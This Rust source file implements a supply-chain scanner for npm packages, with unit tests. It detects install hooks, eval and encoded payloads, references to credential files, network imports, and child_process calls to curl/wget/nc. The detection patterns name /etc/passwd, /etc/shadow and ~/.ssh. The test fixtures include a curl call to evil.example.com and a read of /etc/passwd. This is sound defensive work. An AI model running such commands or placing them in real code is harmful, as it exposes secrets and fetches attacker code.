use regex::Regex;
use serde_json::{Map, Value};
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

type Finding = Map<String, Value>;

fn finding(check: &str, severity: &str, message: &str, vector: &str) -> Finding {
    let mut m = Map::new();
    m.insert("check".into(), Value::String(check.to_string()));
    m.insert("severity".into(), Value::String(severity.to_string()));
    m.insert("message".into(), Value::String(message.to_string()));
    m.insert("vector".into(), Value::String(vector.to_string()));
    m
}

const JS_EXTENSIONS: &[&str] = &["js", "cjs", "mjs", "ts", "tsx", "jsx"];

fn js_files(dir: &Path) -> Vec<PathBuf> {
    WalkDir::new(dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            e.path()
                .extension()
                .and_then(|ext| ext.to_str())
                .map(|ext| JS_EXTENSIONS.contains(&ext))
                .unwrap_or(false)
        })
        .map(|e| e.path().to_path_buf())
        .collect()
}

fn rel(dir: &Path, path: &Path) -> String {
    path.strip_prefix(dir)
        .unwrap_or(path)
        .display()
        .to_string()
}

/// Check package.json for install-time lifecycle scripts.
///
/// Covered set: `preinstall`, `install`, `postinstall`, `prepare` — every hook
/// npm actually runs on a plain consumer `npm install` of a *dependency*
/// (npm >=7 also runs `prepare` for git-dependency/`npm install` local-link
/// cases and, historically, on install for any package with a `prepare`
/// script). Out of scope: `test`, `prepack`, `prepublishOnly` — these only run
/// during the *publishing* workflow (`npm publish`/`npm pack`) or on-demand,
/// never on a downstream `npm install`, so a consumer-side scanner has
/// nothing to gain by flagging them.
pub fn check_install_scripts(pkg_json: &Value) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Some(scripts) = pkg_json.get("scripts") else {
        return findings;
    };
    let present: Vec<&str> = ["preinstall", "install", "postinstall", "prepare"]
        .iter()
        .copied()
        .filter(|&k| scripts.get(k).is_some())
        .collect();
    if !present.is_empty() {
        let mut f = finding(
            "install_script",
            "SUSPECT",
            &format!("Install lifecycle script(s) present: {}", present.join(", ")),
            "B1",
        );
        f.insert(
            "scripts".into(),
            Value::Array(present.iter().map(|&s| Value::String(s.to_string())).collect()),
        );
        findings.push(f);
    }
    findings
}

/// How many characters immediately preceding a base64-like match are inspected
/// for a `;base64,` data-URI marker. Wide enough to span a `data:<mediatype>;base64,`
/// prefix (mediatypes can be long, e.g. `application/vnd.openxmlformats-...`).
const DATA_URI_CONTEXT_WINDOW: usize = 80;

/// Return true if the base64-like match starting at `match_start` in `content`
/// is immediately preceded (within `DATA_URI_CONTEXT_WINDOW` chars) by a
/// `;base64,` marker — i.e. it is a `data:` URI payload, not an obfuscated
/// eval payload. Catches both the single-string form (`"data:image/png;base64,AAAA...=="`,
/// which the regex below never matches as a *whole* anyway since the prefix
/// breaks the pure-base64 run) and the split/concatenated form
/// (`"data:image/png;base64," + "AAAA...=="`), where the payload alone
/// otherwise looks like a clean 100+-char base64 literal.
fn is_data_uri_context(content: &str, match_start: usize) -> bool {
    let window_start = match_start.saturating_sub(DATA_URI_CONTEXT_WINDOW);
    // Snap to a char boundary so the slice doesn't panic on multi-byte content.
    let mut window_start = window_start;
    while window_start < match_start && !content.is_char_boundary(window_start) {
        window_start += 1;
    }
    content[window_start..match_start].contains(";base64,")
}

/// Scan .js files for obfuscation indicators (eval+Buffer.from, bare eval, hex sequences, long base64).
///
/// FP-control notes (deliberately tuned to reduce false positives on benign code
/// without losing true positives — see `tests` below for the balance struck):
///   - base64: a match immediately preceded by a `;base64,` data-URI marker is
///     skipped (image/font/etc. data URIs are common in legitimate packages).
///   - hex: the threshold is 8+ *consecutive* `\xNN` escapes (no literal text between
///     them). Real ANSI styling (`\x1b[31m`, or even several codes glued back-to-back
///     like `\x1b[0m\x1b[1m`) almost never reaches that many raw escapes in a row
///     because each CSI code is followed by literal bracket/digit text, not more
///     escapes; long obfuscated hex payloads comfortably exceed it.
pub fn check_obfuscation(dir: &Path) -> Vec<Finding> {
    let re_eval_buf = Regex::new(r"eval\s*\(\s*Buffer\.from\s*\(").unwrap();
    let re_eval = Regex::new(r"eval\s*\(").unwrap();
    let re_hex = Regex::new(r"(?:\\x[0-9a-fA-F]{2}){8,}").unwrap();
    let re_b64 = Regex::new(r#"['"][A-Za-z0-9+/]{100,}={0,2}['"]"#).unwrap();

    let mut findings = Vec::new();
    for path in js_files(dir) {
        let Ok(content) = std::fs::read_to_string(&path) else { continue };
        let file = rel(dir, &path);

        if re_eval_buf.is_match(&content) {
            let mut f = finding(
                "obfuscation",
                "BLOCK",
                "eval(Buffer.from()) detected — base64-obfuscated payload",
                "B2",
            );
            f.insert("file".into(), Value::String(file.clone()));
            findings.push(f);
        } else if re_eval.is_match(&content) {
            let mut f = finding("obfuscation", "SUSPECT", "eval() call detected", "B2");
            f.insert("file".into(), Value::String(file.clone()));
            findings.push(f);
        }

        if re_hex.is_match(&content) {
            let mut f = finding(
                "obfuscation",
                "SUSPECT",
                "Hex-encoded string sequence detected",
                "B2",
            );
            f.insert("file".into(), Value::String(file.clone()));
            findings.push(f);
        }

        let has_non_data_uri_b64 = re_b64
            .find_iter(&content)
            .any(|m| !is_data_uri_context(&content, m.start()));
        if has_non_data_uri_b64 {
            let mut f = finding(
                "obfuscation",
                "SUSPECT",
                "Long base64-like string literal detected (possible encoded payload)",
                "B2",
            );
            f.insert("file".into(), Value::String(file));
            findings.push(f);
        }
    }
    findings
}

/// Scan .js files for sensitive path/env references (/etc/passwd, ~/.ssh, process.env, etc.).
pub fn check_suspicious_strings(dir: &Path) -> Vec<Finding> {
    let patterns: &[(&str, &str, &str)] = &[
        (r"/etc/passwd", "BLOCK", "References /etc/passwd"),
        (r"/etc/shadow", "BLOCK", "References /etc/shadow"),
        (r"~/\.ssh|/\.ssh/", "BLOCK", "References SSH directory (~/.ssh)"),
        (r"process\.env\b", "SUSPECT", "Reads environment variables (process.env)"),
        (r"os\.homedir\(\)", "SUSPECT", "Reads home directory path (os.homedir())"),
    ];

    let compiled: Vec<(Regex, &str, &str)> = patterns
        .iter()
        .filter_map(|(pat, sev, msg)| Regex::new(pat).ok().map(|re| (re, *sev, *msg)))
        .collect();

    let mut findings = Vec::new();
    for path in js_files(dir) {
        let Ok(content) = std::fs::read_to_string(&path) else { continue };
        let file = rel(dir, &path);
        for (re, sev, msg) in &compiled {
            if re.is_match(&content) {
                let mut f = finding("suspicious_strings", sev, msg, "B2");
                f.insert("file".into(), Value::String(file.clone()));
                findings.push(f);
            }
        }
    }
    findings
}

/// Scan .js files for network-capable module imports (axios, node-fetch, https, http,
/// WebSocket/proxy libraries, etc.) plus shell-exfil via `child_process` spawning
/// `curl`/`wget`/`nc`.
pub fn check_network_imports(dir: &Path) -> Vec<Finding> {
    // Module names with regex-special chars (`.`, `/`) are escaped so they only
    // match the literal package name, not an unintended pattern.
    const MOD: &str = r#"axios|node-fetch|cross-fetch|https?|got|superagent|request|ws|socket\.io|@socket\.io/client|http-proxy-agent|https-proxy-agent|undici"#;
    let patterns = [
        format!(r#"require\s*\(\s*['"](?:{MOD})['"]\s*\)"#),
        format!(r#"import\s+[^;]*?from\s*['"](?:{MOD})['"]"#),
        format!(r#"import\s*['"](?:{MOD})['"]"#),
        format!(r#"import\s*\(\s*['"](?:{MOD})['"]\s*\)"#),
    ];
    let res: Vec<Regex> = patterns.iter().map(|p| Regex::new(p).unwrap()).collect();

    // Shell-exfil vector: child_process exec/spawn invoking curl/wget/nc — lets a
    // package exfiltrate data or fetch a second-stage payload without importing
    // any JS network module at all.
    let re_child_process = Regex::new(r"child_process").unwrap();
    let re_shell_exfil_bin = Regex::new(r#"\b(?:curl|wget|nc)\b"#).unwrap();

    let mut hit_files: Vec<String> = Vec::new();
    let mut shell_exfil_files: Vec<String> = Vec::new();
    for path in js_files(dir) {
        let Ok(content) = std::fs::read_to_string(&path) else { continue };
        let file = rel(dir, &path);
        if res.iter().any(|re| re.is_match(&content)) {
            hit_files.push(file.clone());
        }
        if re_child_process.is_match(&content) && re_shell_exfil_bin.is_match(&content) {
            shell_exfil_files.push(file);
        }
    }

    let mut findings = Vec::new();

    if !hit_files.is_empty() {
        let mut f = finding(
            "network_imports",
            "SUSPECT",
            &format!("Network-capable module imported in {} file(s)", hit_files.len()),
            "B2",
        );
        f.insert(
            "files".into(),
            Value::Array(hit_files.into_iter().map(Value::String).collect()),
        );
        findings.push(f);
    }

    if !shell_exfil_files.is_empty() {
        let mut f = finding(
            "shell_exfil",
            "SUSPECT",
            &format!(
                "child_process spawning curl/wget/nc in {} file(s) — possible shell-based exfiltration",
                shell_exfil_files.len()
            ),
            "B2",
        );
        f.insert(
            "files".into(),
            Value::Array(shell_exfil_files.into_iter().map(Value::String).collect()),
        );
        findings.push(f);
    }

    findings
}

/// Scan .js files for dynamic require(variable) — require called with a non-literal argument.
pub fn check_dynamic_require(dir: &Path) -> Vec<Finding> {
    let re = Regex::new(r#"require\(\s*[^'")\s][^)]*\)"#).unwrap();

    let mut findings = Vec::new();
    for path in js_files(dir) {
        let Ok(content) = std::fs::read_to_string(&path) else { continue };
        if re.is_match(&content) {
            let mut f = finding(
                "dynamic_require",
                "SUSPECT",
                "Dynamic require(variable) pattern — module loaded at runtime from a variable",
                "B2",
            );
            f.insert("file".into(), Value::String(rel(dir, &path)));
            findings.push(f);
        }
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use std::fs;
    use tempfile::TempDir;

    fn dir_with(files: &[(&str, &str)]) -> TempDir {
        let tmp = TempDir::new().unwrap();
        for (name, content) in files {
            fs::write(tmp.path().join(name), content).unwrap();
        }
        tmp
    }

    fn sevs(findings: &[Finding]) -> Vec<String> {
        findings
            .iter()
            .map(|f| f.get("severity").and_then(|v| v.as_str()).unwrap_or("").to_string())
            .collect()
    }

    fn vectors(findings: &[Finding]) -> Vec<String> {
        findings
            .iter()
            .map(|f| f.get("vector").and_then(|v| v.as_str()).unwrap_or("").to_string())
            .collect()
    }

    fn checks(findings: &[Finding]) -> Vec<String> {
        findings
            .iter()
            .map(|f| f.get("check").and_then(|v| v.as_str()).unwrap_or("").to_string())
            .collect()
    }

    #[test]
    fn install_scripts_detected() {
        let pkg = json!({ "scripts": { "postinstall": "node x.js" } });
        assert_eq!(sevs(&check_install_scripts(&pkg)), vec!["SUSPECT"]);
        assert_eq!(vectors(&check_install_scripts(&pkg)), vec!["B1"]);
        let clean = json!({ "scripts": { "test": "jest" } });
        assert!(check_install_scripts(&clean).is_empty());
        let none = json!({});
        assert!(check_install_scripts(&none).is_empty());
    }

    // 3c: `prepare` joins the checked lifecycle set (pre/install/post/prepare).
    #[test]
    fn install_scripts_prepare_detected() {
        let pkg = json!({ "scripts": { "prepare": "node build.js" } });
        let f = check_install_scripts(&pkg);
        assert_eq!(sevs(&f), vec!["SUSPECT"]);
        let scripts = f[0].get("scripts").unwrap().as_array().unwrap();
        assert!(scripts.iter().any(|v| v.as_str() == Some("prepare")));
    }

    // 3c: out-of-scope hooks (test/prepack/prepublishOnly) never run on a
    // downstream `npm install`, so they must NOT be flagged.
    #[test]
    fn install_scripts_prepack_and_prepublish_out_of_scope() {
        let pkg = json!({
            "scripts": { "test": "jest", "prepack": "node x.js", "prepublishOnly": "node y.js" }
        });
        assert!(check_install_scripts(&pkg).is_empty());
    }

    #[test]
    fn obfuscation_eval_buffer_blocks() {
        let d = dir_with(&[("a.js", "const x = eval(Buffer.from('aaa','base64'));")]);
        let f = check_obfuscation(d.path());
        assert!(sevs(&f).contains(&"BLOCK".to_string()));
        assert!(vectors(&f).iter().all(|v| v == "B2"));
    }

    #[test]
    fn obfuscation_bare_eval_is_suspect() {
        let d = dir_with(&[("a.js", "eval(userInput);")]);
        let f = check_obfuscation(d.path());
        assert_eq!(sevs(&f), vec!["SUSPECT"]);
        assert_eq!(vectors(&f), vec!["B2"]);
    }

    // 3d TRUE-POSITIVE control: a genuine 100+ char base64 payload literal
    // (no data: URI nearby) must still be flagged SUSPECT.
    #[test]
    fn obfuscation_long_base64_literal_is_suspect() {
        let payload = "A".repeat(150);
        let d = dir_with(&[("a.js", &format!("const p = \"{}==\";", payload))]);
        let f = check_obfuscation(d.path());
        assert!(
            f.iter().any(|f| f.get("message").and_then(|v| v.as_str()) == Some(
                "Long base64-like string literal detected (possible encoded payload)"
            )),
            "expected a base64 finding; got: {:?}",
            f
        );
    }

    // 3d FP-CONTROL: a base64 literal that is a `data:` URI payload (image/font/etc.)
    // must NOT be flagged, whether inline or split via string concatenation.
    #[test]
    fn obfuscation_data_uri_base64_is_not_flagged() {
        let payload = "A".repeat(150);
        let inline = dir_with(&[(
            "a.js",
            &format!("const img = \"data:image/png;base64,{}==\";", payload),
        )]);
        assert!(
            check_obfuscation(inline.path()).is_empty(),
            "inline data: URI must not be flagged"
        );

        let split = dir_with(&[(
            "b.js",
            &format!(
                "const prefix = \"data:image/png;base64,\";\nconst img = prefix + \"{}==\";",
                payload
            ),
        )]);
        assert!(
            check_obfuscation(split.path()).is_empty(),
            "concatenated data: URI must not be flagged"
        );
    }

    // 3d FP-CONTROL: chalk-style ANSI escape strings must NOT trip the hex rule,
    // even when several codes are glued back-to-back with no literal text between
    // some of the escapes.
    #[test]
    fn obfuscation_chalk_style_ansi_is_not_flagged() {
        let d = dir_with(&[(
            "a.js",
            r#"console.log("\x1b[31mHello\x1b[0m", "\x1b[1m\x1b[32mWorld\x1b[0m");"#,
        )]);
        let f = check_obfuscation(d.path());
        assert!(
            !f.iter().any(|f| f.get("message").and_then(|v| v.as_str())
                == Some("Hex-encoded string sequence detected")),
            "chalk-style ANSI must not trip the hex rule; got: {:?}",
            f
        );
    }

    // 3d TRUE-POSITIVE control: a long fully-hex-encoded payload (8+ consecutive
    // \xNN escapes, no separating literal text) must still be flagged SUSPECT.
    #[test]
    fn obfuscation_long_hex_payload_is_suspect() {
        let d = dir_with(&[(
            "a.js",
            r#"const p = "\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x00\x01\x02";"#,
        )]);
        let f = check_obfuscation(d.path());
        assert!(
            f.iter().any(|f| f.get("message").and_then(|v| v.as_str())
                == Some("Hex-encoded string sequence detected")),
            "expected a hex finding; got: {:?}",
            f
        );
    }

    #[test]
    fn suspicious_strings_etc_passwd_blocks() {
        let d = dir_with(&[("a.js", "fs.readFileSync('/etc/passwd');")]);
        let f = check_suspicious_strings(d.path());
        assert!(sevs(&f).contains(&"BLOCK".to_string()));
        assert!(vectors(&f).iter().all(|v| v == "B2"));
    }

    #[test]
    fn suspicious_strings_env_is_suspect() {
        let d = dir_with(&[("a.js", "const t = process.env.TOKEN;")]);
        let f = check_suspicious_strings(d.path());
        assert!(sevs(&f).contains(&"SUSPECT".to_string()));
    }

    #[test]
    fn network_imports_cjs_and_esm() {
        let d = dir_with(&[
            ("a.js", "const ax = require('axios');"),
            ("b.mjs", "import axios from 'axios';"),
        ]);
        let f = check_network_imports(d.path());
        assert_eq!(f.len(), 1);
        let files = f[0].get("files").unwrap().as_array().unwrap();
        assert_eq!(files.len(), 2);
        assert_eq!(f[0].get("vector").and_then(|v| v.as_str()), Some("B2"));
    }

    #[test]
    fn network_imports_clean() {
        let d = dir_with(&[("a.js", "const path = require('path');")]);
        assert!(check_network_imports(d.path()).is_empty());
    }

    // 3b: broadened module set — ws and undici must be detected.
    #[test]
    fn network_imports_ws_and_undici_detected() {
        let d = dir_with(&[
            ("a.js", "const WebSocket = require('ws');"),
            ("b.js", "const { request } = require('undici');"),
        ]);
        let f = check_network_imports(d.path());
        assert_eq!(checks(&f), vec!["network_imports"]);
        let files = f[0].get("files").unwrap().as_array().unwrap();
        assert_eq!(files.len(), 2);
    }

    // 3b: child_process spawning curl is a shell-exfil vector distinct from a
    // JS-level network import.
    #[test]
    fn shell_exfil_curl_spawn_detected() {
        let d = dir_with(&[(
            "a.js",
            "const { exec } = require('child_process'); exec('curl https://evil.example.com/x');",
        )]);
        let f = check_network_imports(d.path());
        assert!(checks(&f).contains(&"shell_exfil".to_string()), "got: {:?}", f);
        assert!(f
            .iter()
            .find(|f| f.get("check").and_then(|v| v.as_str()) == Some("shell_exfil"))
            .map(|f| f.get("vector").and_then(|v| v.as_str()) == Some("B2"))
            .unwrap_or(false));
    }

    // 3b negative control: child_process alone (no curl/wget/nc) must not trip shell_exfil.
    #[test]
    fn shell_exfil_negative_control() {
        let d = dir_with(&[(
            "a.js",
            "const { exec } = require('child_process'); exec('ls -la');",
        )]);
        let f = check_network_imports(d.path());
        assert!(!checks(&f).contains(&"shell_exfil".to_string()), "got: {:?}", f);
    }

    #[test]
    fn dynamic_require_positive() {
        let d = dir_with(&[("a.js", "const m = require(name);")]);
        assert_eq!(sevs(&check_dynamic_require(d.path())), vec!["SUSPECT"]);
        let d2 = dir_with(&[("b.js", "require(a + b);")]);
        assert_eq!(sevs(&check_dynamic_require(d2.path())), vec!["SUSPECT"]);
    }

    #[test]
    fn dynamic_require_negative() {
        let d = dir_with(&[("a.js", "require('fs');\nrequire();\nconst p = require('path');")]);
        assert!(check_dynamic_require(d.path()).is_empty());
    }
}
